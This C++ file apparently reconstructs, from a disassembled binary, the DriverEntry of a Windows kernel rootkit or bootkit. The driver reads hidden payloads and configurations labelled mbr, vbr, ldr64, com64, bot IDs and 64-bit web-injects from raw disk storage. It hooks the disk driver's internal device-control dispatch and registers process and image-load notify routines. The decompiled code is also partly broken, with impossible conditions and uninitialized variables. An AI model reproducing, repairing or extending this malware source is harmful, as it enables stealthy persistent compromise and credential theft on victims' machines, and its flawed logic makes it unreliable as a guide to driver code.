
#include "Header.h"


EXTERN_C NTSTATUS DriverEntry(_In_ PDRIVER_OBJECT DriverObject, _In_ PUNICODE_STRING RegistryPath) {
	ULONG majorVersion, minorVersion;
	ULONG dword_40AA0C, dword_40AA18, dword_40AA20, dword_40AA54, dword_40B1DC, dword_40B920;
	ULONG dword_40B924, dword_40A980, dword_40A984, dword_40AF3C;
	ULONG unk_40A938;
	ULONG qword_40A948;
	ULONG64 qword_40B1D0;
	LIST_ENTRY qword_40A5F8, qword_40A828, qword_40A590;
	BYTE byte_40AA6C;
	UNICODE_STRING usHardDisk{};
	OBJECT_ATTRIBUTES oa{};
	HANDLE fileHandle, threadHandle1, threadHandle2;
	IO_STATUS_BLOCK ioStatusBlock{};
	KEVENT kevent_40A950, kevent_40A5B0, kevent_40A870, kevent_40A840, kevent_40A688;
	PVOID fileObject, threadObject1, threadObject2, _pool_40B910;
	__pool_struct_40AA58* _pool_40AA58;
	PDEVICE_OBJECT acpidevObj, devobj_40A718;
	LARGE_INTEGER _largeInteger{};
	CHAR mbr[] = "mbr", vbr[] = "vbr", main[] = "main", affid[] = "affid", subbid[] = "subid";
	CHAR bid[] = "bid", ldr64[] = "ldr64", ldr32[] = "ldr32", com64[] = "com64", bbr_conf[] = "bbr_conf", serf_conf[] = "serf_conf";
	CHAR injBegin[] = "[injects_begin_64]", injEnd[] = "[injects_end_64]";
	struct _qword_40A940 qword_40A940;

	auto poolWithTag = ExAllocatePoolWithTag(NonPagedPool, 0x18, POOL_TAG); // poolWithTag is a struct
	if (poolWithTag == __nullptr) {
		return STATUS_NO_MEMORY;
	}
	RtlZeroMemory(poolWithTag, 0x18);

	PsGetVersion(&majorVersion, &minorVersion, NULL, NULL);
	if (majorVersion == 0x5) {
		dword_40AA0C = 1;
	}
	else {
		if (majorVersion > 0x5)
			dword_40AA0C = 0x2;
	}

	ExInitializeResourceLite(static_cast<PERESOURCE>(&_eresource1));
	ExInitializeResourceLite(static_cast<PERESOURCE>(&_eresource2));
	PsGetVersion(&majorVersion, &minorVersion, NULL, NULL);
	RtlInitUnicodeString(static_cast<PUNICODE_STRING>(&usHardDisk), L"\\Device\\HardDisk0\\DR0");
	InitializeObjectAttributes(&oa, static_cast<PUNICODE_STRING>(&usHardDisk), 0x240, NULL, NULL);
	if (!NT_SUCCESS(IoCreateFile(static_cast<PHANDLE>(&fileHandle), 0x1, static_cast<POBJECT_ATTRIBUTES>(&oa), static_cast<PIO_STATUS_BLOCK>(&ioStatusBlock),
		NULL, NULL, 0x7, 0x1, NULL, NULL, NULL, CreateFileTypeNone, NULL, 0x400))) {
		return STATUS_INVALID_ADDRESS;
	}

	if (!NT_SUCCESS(ObReferenceObjectByHandle(fileHandle, NULL, NULL, NULL, &fileObject, NULL))) {
		return STATUS_ORDINAL_NOT_FOUND;
	}

	// is fileObject a PDRIVER_OBJECT ????
	g_lowerDeviceObject = *reinterpret_cast<PDEVICE_OBJECT*>((PUCHAR)fileObject + 0x8);
	auto devObj = IoGetLowerDeviceObject(g_lowerDeviceObject);
	if (devObj) {
		if (!wcscmp(devObj->DriverObject->DriverName.Buffer, L"\\Driver\\ACPI") &&
			!wcscmp(devObj->DriverObject->DriverName.Buffer, L"\\Driver\\acpi")) {
			acpidevObj = IoGetLowerDeviceObject(devObj);
		}
	}

	if (!sub_4031D8(g_lowerDeviceObject->DriverObject, NULL, &dword_40AA18, &dword_40AA20)) {
		return STATUS_INVALID_IMAGE_NE_FORMAT;
	}

	dword_40AA24 = dword_40AA20;
	if (sub_401360(&qword_40AED8, g_lowerDeviceObject->DriverObject) & 0x0C0000000 == 0x0C0000000) {
		if (acpidevObj == __nullptr) {
			acpidevObj = devObj;
			devobj_40A718 = devObj;
		}
		else {
			devobj_40A718 = acpidevObj;
		}
	}
	
	if (NT_SUCCESS(sub_401714(qword_40AED8, g_lowerDeviceObject->DriverObject, &mbr, &unk_40A938))) {
		qword_40AEE0 = qword_40A948;
		dword_40AECC = reinterpret_cast<ULONG>(qword_40A940.a4); // *(qword_40A940 + 0x18)
		auto _allocatedPool = ExAllocatePoolWithTag(NonPagedPool, dword_40AA24, POOL_TAG);
		if (_allocatedPool != __nullptr) {
			if (sub_403384(g_lowerDeviceObject->DriverObject, NULL, NULL, dword_40AA24, _allocatedPool, 0x1234567) != __nullptr) {
				for (auto i = 0; i < 0x4; i++) {
					auto j = i << 0x4;
					//if (*(BYTE*)((PUCHAR)_allocatedPool + 0x1BE + j) == 0x80){}
					if (*reinterpret_cast<BYTE*>(static_cast<UCHAR*>(_allocatedPool) + 0x1BE + j) == 0x80) {
						dword_40AEFC = *reinterpret_cast<ULONG*>(static_cast<UCHAR*>(_allocatedPool) + 0x1C6 + j);
						auto _ecx = *reinterpret_cast<ULONG*>(static_cast<UCHAR*>(_allocatedPool) + 0x1CA + j);
						auto _eax = *reinterpret_cast<ULONG*>(static_cast<UCHAR*>(_allocatedPool) + 0x1C6 + j);
						dword_40AF00 = _ecx + _eax - 1;
					}
				}
			}
		}
	}

	if (!NT_SUCCESS(sub_401714(qword_40AED8, g_lowerDeviceObject->DriverObject, &vbr, poolWithTag))) {
		qword_40AEF0 = 0;
		dword_40AEF8 = 0;
	}
	else {
		qword_40AEF0 = *reinterpret_cast<ULONG64*>(static_cast<UCHAR*>(poolWithTag) + 0x10);
		auto _rax = *reinterpret_cast<ULONG64*>(static_cast<UCHAR*>(poolWithTag) + 0x8);
		dword_40AEF8 = *reinterpret_cast<ULONG*>(_rax + 0x18);
	}
	RtlZeroMemory(poolWithTag, 0x18);

	if (!NT_SUCCESS(sub_4015B4(qword_40AED8, &dword_40AA48, &dword_40AA1C))) {
		dword_40AA48 = 0;
		dword_40AA1C = 0;
	}

	sub_4015B4(qword_40AED8, &dword_40AA48, &dword_40AA1C);
	if (!sub_401714(qword_40AED8, g_lowerDeviceObject->DriverObject, &main, poolWithTag)) {
		return STATUS_SUCCESS;
	}

	qword_40B1D0 = *reinterpret_cast<ULONG64*>(static_cast<UCHAR*>(poolWithTag) + 0x10);
	sub_4015B4(qword_40AED8, &dword_40AA48, &dword_40AA1C);
	ObfDereferenceObject(fileObject);
	if (fileHandle)
		ZwClose(fileHandle);

	if (qword_40B1D0) {
		auto v15 = sub_404718(qword_40B1D0, &injBegin, &injEnd, &dword_40AA54);
		if (v15 == __nullptr) {
			byte_40AA6C = 0;
			if (acpidevObj == __nullptr) {
				devobj_40A718 = devObj;
			}
			else {
				devobj_40A718 = acpidevObj;
			}

		loc_4029B4:
			Dispatch_Irp_Mj_Internal_Dev_Ctl = devObj->DriverObject->MajorFunction[IRP_MJ_INTERNAL_DEVICE_CONTROL];
			Dispatch_Irp_Mj_Dev_Ctl = devObj->DriverObject->MajorFunction[IRP_MJ_DEVICE_CONTROL];
			devObj->DriverObject->MajorFunction[IRP_MJ_INTERNAL_DEVICE_CONTROL] = sub_402334;
			InitializeListHead(static_cast<PLIST_ENTRY>(&qword_40A5F8));
			KeInitializeEvent(&kevent_40A950, SynchronizationEvent, FALSE);
			KeInitializeEvent(&kevent_40A5B0, SynchronizationEvent, FALSE);
			InitializeListHead(static_cast<PLIST_ENTRY>(&qword_40A828));
			InitializeListHead(static_cast<PLIST_ENTRY>(&qword_40A590));
			PsSetCreateProcessNotifyRoutine(&PcreateProcessNotifyRoutine, FALSE);
			PsSetLoadImageNotifyRoutine(&PloadImageNotifyRoutine);
			KeInitializeEvent(&kevent_40A870, SynchronizationEvent, FALSE);
			KeInitializeEvent(&kevent_40A840, SynchronizationEvent, FALSE);
			KeInitializeEvent(&kevent_40A688, SynchronizationEvent, FALSE);

			auto _driverStart = *reinterpret_cast<PVOID*>(DriverObject->DriverStart);
			if (_driverStart != __nullptr && RegistryPath != __nullptr) {
				_largeInteger.QuadPart = 0xFFFFFFFFFE363C80;
				KeDelayExecutionThread(KernelMode, FALSE, &_largeInteger);
				KeSetEvent(static_cast<PRKEVENT>(&kevent_40A870), NULL, FALSE);
			}

			PsCreateSystemThread(&threadHandle1, 0, __nullptr, NULL, __nullptr, reinterpret_cast<PKSTART_ROUTINE>(sub_404298), __nullptr);
			if (threadHandle1 != __nullptr) {
				if (ObReferenceObjectByHandle(threadHandle1, 0x1FFFFF, __nullptr, KernelMode, &threadObject1, __nullptr) == 0x0) {
					ZwClose(threadHandle1);
				}
				else
					threadObject1 = NULL;
			}

			PsCreateSystemThread(&threadHandle2, 0, __nullptr, NULL, __nullptr, reinterpret_cast<PKSTART_ROUTINE>(sub_4052AC), __nullptr);
			if (threadHandle2 != __nullptr) {
				if (ObReferenceObjectByHandle(threadHandle2, 0x1FFFFF, __nullptr, KernelMode, &threadObject2, __nullptr) == 0x0) {
					ZwClose(threadHandle2);
				}
				else
					threadObject2 = NULL;
			}

			return STATUS_SUCCESS;
		}

		byte_40AA6C = 1;
		_pool_40AA58 = reinterpret_cast<__pool_struct_40AA58*>(ExAllocatePoolWithTag(NonPagedPool, dword_40AA54 * 0x110, POOL_TAG));
		if (!_pool_40AA58) {
			return STATUS_UNSUCCESSFUL;
		}
		RtlZeroMemory(_pool_40AA58, dword_40AA54 * 0x110);
		auto _v17 = 0;
		if (dword_40AA54 > 0) {
			auto _str = reinterpret_cast<CHAR*>(static_cast<UCHAR*>(v15) + 0x8);
			do {
				InitializeListHead(&_pool_40AA58->ListHead);
				auto _strlen = strlen(_str);
				auto _r15 = 1;
				auto _rbx = 1;
				auto _i = 0;
				if (_strlen > 0) {
					do {
						if (*_str == 0x2C) {
							auto _r13 = reinterpret_cast<struct _r13_struct*>(ExAllocatePool(NonPagedPool, 0x48));
							RtlZeroMemory(_r13, 0x48);
							if (_r13 != __nullptr) {
								auto _len_ = strlen(_str);
								RtlMoveMemory(_r13->param2, _str, _len_);	// _r13+0x10
								InsertHeadList(&_pool_40AA58->ListHead, &_r13->ListHead);
							}
							++_rbx;
							++_r15;
							--_strlen;
						}
					} while (_strlen > 0);
				}
				strlen(_str - 0x8);
				_i *= 0x110;
				RtlMoveMemory(_pool_40AA58->param2, _str - 0x8, _strlen);
				auto _len_ = strlen(_str);
				RtlMoveMemory(_pool_40AA58 + 0x42, _str, _len_);
				if (sub_401714(qword_40AED8, g_lowerDeviceObject, _pool_40AA58->param2, poolWithTag) >= 0) {
					*reinterpret_cast<PVOID*>(reinterpret_cast<UCHAR*>(_pool_40AA58) + _i + 0x80) =
						*reinterpret_cast<PVOID*>(static_cast<UCHAR*>(poolWithTag) + 0x10);
					auto _ecx = *reinterpret_cast<PVOID*>(static_cast<UCHAR*>(poolWithTag) + 0x8);
					*reinterpret_cast<PVOID*>(reinterpret_cast<UCHAR*>(_pool_40AA58) + _i + 0x88) =
						static_cast<UCHAR*>(_ecx) + 0x18;
				}

				if (*reinterpret_cast<PVOID*>(reinterpret_cast<UCHAR*>(_pool_40AA58) + _i + 0x80) != __nullptr) {
					if (*reinterpret_cast<PVOID*>(reinterpret_cast<UCHAR*>(_pool_40AA58) + _i + 0x88) != __nullptr) {
						byte_40AA6C = 0x0;
					}
				}
				++_v17;
				_str += 0x10;
				_i += 0x110;
			} while (dword_40AA54 > _v17);
		}
	}
	else {
		byte_40AA6C = 0;
	}

	if (sub_401714(qword_40AED8, g_lowerDeviceObject, affid, poolWithTag) > 0x0) {
		_pool_40B910 = ExAllocatePoolWithTag(NonPagedPool, *reinterpret_cast<ULONG64*>((UCHAR*)poolWithTag + 0x8), POOL_TAG);
		if (_pool_40B910 == __nullptr) {
			dword_40B1DC = 0;
		}
		else {
			auto _ien = *reinterpret_cast<PVOID*>((UCHAR*)poolWithTag + 0x8);
			dword_40B1DC = *reinterpret_cast<ULONG*>((UCHAR*)_ien + 0x18);
			RtlMoveMemory(_pool_40B910, *(PVOID*)((UCHAR*)poolWithTag + 0x10), *(ULONG*)_ien + 0x18);
		}
	}

	auto _size_pointer_ = *reinterpret_cast<PVOID*>((UCHAR*)poolWithTag + 0x8);
	auto _size_ = *reinterpret_cast<ULONG*>((UCHAR*)_size_pointer_ + 0x18);

	if (sub_401714(qword_40AED8, g_lowerDeviceObject, &subbid, poolWithTag) >= 0x0) {
		auto _sub_pool_ = ExAllocatePoolWithTag(NonPagedPool, _size_, POOL_TAG);
		if (_sub_pool_ != __nullptr) {
			RtlMoveMemory(_sub_pool_, *reinterpret_cast<PVOID*>((UCHAR*)poolWithTag + 0x10), _size_);
			dword_40B920 = _size_;
		}
		else {
			dword_40B920 = 0;
		}
	}

	if (sub_401714(qword_40AED8, g_lowerDeviceObject, &bid, poolWithTag) >= 0x0) {
		auto _bid_pool_ = ExAllocatePoolWithTag(NonPagedPool, _size_, POOL_TAG);
		if (_bid_pool_ != __nullptr) {
			dword_40B924 = _size_;
			RtlMoveMemory(_bid_pool_, *reinterpret_cast<PVOID*>((UCHAR*)poolWithTag + 0x10), _size_);
		}
		else {
			dword_40B924 = 0;
		}
	}

	if (sub_401714(qword_40AED8, g_lowerDeviceObject, &ldr64, poolWithTag) >= 0x0) {
		auto _ldr64_pool_ = ExAllocatePoolWithTag(NonPagedPool, _size_, POOL_TAG);
		if (_ldr64_pool_ == __nullptr) {
			dword_40A980 = 0;
			goto loc_4029B4;
		}
		dword_40A980 = _size_;
		RtlMoveMemory(_ldr64_pool_, *reinterpret_cast<PVOID*>((UCHAR*)poolWithTag + 0x10), _size_);
	}

	if (sub_401714(qword_40AED8, g_lowerDeviceObject, &ldr32, poolWithTag) >= 0x0) {
		auto _ldr32_pool_ = ExAllocatePoolWithTag(NonPagedPool, _size_, POOL_TAG);
		if (_ldr32_pool_ == __nullptr) {
			dword_40A984 = 0;
			goto loc_4029B4;
		}
		dword_40A984 = _size_;
		RtlMoveMemory(_ldr32_pool_, *reinterpret_cast<PVOID*>((UCHAR*)poolWithTag + 0x10), _size_);
	}

	if (sub_401714(qword_40AED8, g_lowerDeviceObject, &com64, poolWithTag) >= 0x0) {
		auto _com64_pool_ = ExAllocatePoolWithTag(NonPagedPool, _size_, POOL_TAG);
		if (_com64_pool_ != __nullptr) {
			dword_40AF3C = _size_;
			RtlMoveMemory(_com64_pool_, *reinterpret_cast<PVOID*>((UCHAR*)poolWithTag + 0x10), _size_);
		}
		else {
			dword_40AF3C = 0;
		}
	}

	if (sub_401714(qword_40AED8, g_lowerDeviceObject, &bbr_conf, poolWithTag) >= 0x0) {
		auto _bbrconf_pool_ = ExAllocatePoolWithTag(NonPagedPool, _size_, POOL_TAG);
		if (_bbrconf_pool_ != __nullptr) {
			dword_40A9A0 = _size_;
			RtlMoveMemory(_bbrconf_pool_, *reinterpret_cast<PVOID*>((UCHAR*)poolWithTag + 0x10), _size_);
		}
		else {
			dword_40A9A0 = 0;
		}
	}

	if (sub_401714(qword_40AED8, g_lowerDeviceObject, &serf_conf, poolWithTag) >= 0x0) {
		auto _serfconf_pool_ = ExAllocatePoolWithTag(NonPagedPool, _size_, POOL_TAG);
		if (_serfconf_pool_ != __nullptr) {
			dword_40A9A4 = _size_;
			RtlMoveMemory(_serfconf_pool_, *reinterpret_cast<PVOID*>((UCHAR*)poolWithTag + 0x10), _size_);
		}
		else {
			dword_40A9A4 = 0;
		}
	}

	return STATUS_SUCCESS;

}